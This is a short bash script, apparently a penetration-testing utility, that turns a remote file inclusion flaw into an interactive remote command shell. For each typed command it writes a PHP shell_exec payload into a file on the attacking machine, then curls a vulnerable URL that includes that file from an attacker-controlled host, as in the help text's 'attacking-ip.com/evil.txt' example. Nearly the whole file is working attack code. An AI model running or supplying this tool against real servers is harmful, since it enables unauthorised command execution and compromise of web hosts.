#!/bin/bash
#
# This bash script is used for simplifying RCE through an RFI.
# https://roberthosborne.com/f/directory-traversal
#
# REQUIREMENTS
#   - This requires a file on the attack machince containing the RCE "<?php print shell_exec("cmd");?>"
#   This file is updated with every command executed and is what allows for the simplified RCE.
#   - curl is not required but should be installed to obtain the most from this tool. Chances are you're on Kali anyway

# Allow Ctrl+C to kill pingsweep
trap '
  trap - INT # restore default INT handler
  kill -s INT "$$"
' INT

if [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ] ; then
                # This option displays a help message and command execution examples
                echo ""
                echo "OsbornePro rfi-rce 1.0 ( https://roberthosborne.com )"
                echo ""
                echo "USAGE: rfi-rce -f <attacker file> -u <url> -c <curl options>"
                echo ""
                echo "OPTIONS:"
                echo "  -h : Displays the help information for the command."
                echo "  -f : Defines full path to a file on the attacker machine containing the RCE code."
                echo "  -u : Defines the full path URL on the vulnerable machine including the file from the -f parameter"
                echo "  -c : Set options available in curl to adjust to a variety of situations"
                echo ""
                echo "EXAMPLES:"
                echo "  rfi-rce -f /var/www/html/evil.txt -u 'https://website.com/search.php?page=http://attacking-ip.com/evil.txt' -c --insecure"
                echo "  # This example contains the command entry variable in evil.txt on the attack machine which creates RCE on the target."
                echo ""
                exit
fi

while getopts ":c:u:f:" OPT; do
        case $OPT in
                u) url=$OPTARG;;
                f) file=$OPTARG;;
                c) curlopts=$OPTARG;;
        esac
done

if [[ -z $url ]]; then
        printf "[!] URL was not defined\n"
        exit
fi

if [[ -f $file ]]; then 
        while :; do 
                printf "[rfi-rce>] "
                read cmd
                printf "<?php print shell_exec(\"${cmd}\");?>" > ${file}
                curl ${curlopts} "${url}"
                printf "\n"
        done
fi
